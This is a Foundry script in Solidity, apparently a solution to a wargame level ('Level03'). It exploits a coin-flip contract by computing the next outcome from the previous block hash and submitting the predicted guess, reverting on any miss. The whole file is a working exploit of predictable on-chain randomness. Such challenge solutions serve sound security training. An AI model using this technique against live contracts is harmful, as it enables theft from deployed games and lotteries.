// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level03.sol";

contract AttackerScript is Script {
    Level03 level03 = Level03(0xA87f1bFF996517fC236c20bb30d918eb9fbDC849);

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      //while(level03.consecutiveWins() < 10) { //Not working on live chain
        console.log("Consecutive Wins: ", level03.consecutiveWins());
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("block: ", blockValue);
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool isTrue;

        if (side) {
            isTrue = level03.flip(true);
        } else {
            isTrue = level03.flip(false);
        }
        if(!isTrue) {
          console.log("Bad guess, revert");
          revert();
        }
      //}
      console.log("Consecutive Wins end call: ", level03.consecutiveWins());
      vm.stopBroadcast();
    }
}
